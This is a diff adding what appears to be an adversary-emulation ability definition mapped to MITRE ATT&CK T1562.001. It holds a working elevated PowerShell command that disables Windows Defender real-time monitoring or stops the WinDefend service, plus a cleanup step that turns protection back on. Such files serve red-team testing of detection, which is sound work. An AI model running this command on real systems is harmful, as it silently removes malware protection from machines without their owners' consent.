@@ -1,0 +1,39 @@
+---
+
+- id: 49470433-30ce-4714-a44b-bea9dbbeca9a
+  name: Disable Windows Defender Real-Time Protection
+  description: Disable Windows Defender Real-Time Protection
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: "Impair Defenses: Disable or Modify Tools"
+  privilege: Elevated
+  platforms:
+    windows:
+      psh:
+        command: |
+          if (Get-Command "Set-MPPreference" -ErrorAction SilentlyContinue) {
+            Set-MPPreference -DisableRealtimeMonitoring 1;
+          } else {
+            $service = Get-Service WinDefend -ErrorAction SilentlyContinue;
+            if ($service) {
+              if ($service.Status -eq "Running") {
+                Stop-Service WinDefend;
+              }
+            } else {
+              echo "Windows Defender service not found.";
+              exit 1;
+            };
+          };
+        cleanup:
+          if (Get-Command "Set-MPPreference" -ErrorAction SilentlyContinue) {
+            Set-MPPreference -DisableRealtimeMonitoring 0;
+          } else {
+            $service = Get-Service WinDefend -ErrorAction SilentlyContinue;
+            if ($service) {
+              Start-Service WinDefend;
+            } else {
+              echo "Windows Defender service not found.";
+              exit 1;
+            };
+          };
